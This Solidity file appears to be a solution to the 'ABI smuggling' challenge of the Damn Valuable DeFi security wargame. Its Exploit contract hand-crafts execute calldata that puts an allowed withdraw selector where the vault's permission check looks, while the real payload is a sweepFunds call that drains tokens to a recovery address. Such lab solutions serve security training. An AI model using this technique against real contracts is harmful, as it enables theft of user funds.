pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {SelfAuthorizedVault, AuthorizedExecutor, IERC20} from "../../src/abi-smuggling/SelfAuthorizedVault.sol";

contract Exploit {
    SelfAuthorizedVault public vault;
    IERC20 public token;
    address public player;
    address public recovery;

    event LogExecuteSelector(bytes executeSelector);
    event LogTargetAddress(bytes target);
    event LogDataOffset(bytes dataOffset);
    event LogEmptyData(bytes emptyData);
    event LogWithdrawSelectorPadded(bytes withdrawSelectorPadded);
    event LogActionDataLength(uint actionDataLength);
    event LogSweepFundsCalldata(bytes sweepFundsCalldata);
    event LogCalldataPayload(bytes calldataPayload);

    constructor(address _vault, address _token, address _recovery) {
        vault = SelfAuthorizedVault(_vault);
        token = IERC20(_token);
        recovery = _recovery;
        player = msg.sender;
    }

    function executeExploit() external returns (bytes memory) {
        require(msg.sender == player, "Only player can execute exploit");

        bytes4 executeSelector = vault.execute.selector;

        bytes memory target = abi.encodePacked(bytes12(0), address(vault));

        bytes memory dataOffset = abi.encodePacked(uint256(0x80)); 

        bytes memory emptyData = abi.encodePacked(uint256(0));

        bytes memory withdrawSelectorPadded = abi.encodePacked(
            bytes4(0xd9caed12), 
            bytes28(0) 
        );

        bytes memory sweepFundsCalldata = abi.encodeWithSelector(
            vault.sweepFunds.selector,
            recovery,
            token
        );

        uint256 actionDataLengthValue = sweepFundsCalldata.length;
        emit LogActionDataLength(actionDataLengthValue);
        bytes memory actionDataLength = abi.encodePacked(
            uint256(actionDataLengthValue)
        );

        bytes memory calldataPayload = abi.encodePacked(
            executeSelector, 
            target, 
            dataOffset, 
            emptyData, 
            withdrawSelectorPadded, 
            actionDataLength, 
            sweepFundsCalldata 
        );

        
        emit LogCalldataPayload(calldataPayload);

        return calldataPayload;
    }
}
